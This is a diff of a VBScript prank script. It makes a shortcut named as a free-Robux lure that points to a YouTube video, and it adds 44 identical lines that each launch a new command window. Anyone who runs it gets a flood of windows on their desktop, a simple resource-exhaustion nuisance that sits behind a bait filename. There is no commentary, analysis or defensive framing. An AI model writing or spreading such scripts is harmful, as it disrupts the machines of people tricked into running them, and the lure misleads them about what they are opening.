@@ -44,3 +44,47 @@ oUrlLink.Save
 Set oUrlLink = WshShell.CreateShortcut("WOWYOUGOTFREEROUBUT.url")
 oUrlLink.TargetPath = "https://www.youtube.com/watch?v=b4XpMTUlorc"
 oUrlLink.Save
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
+WshShell.Run "cmd.exe /c start cmd", 1, False
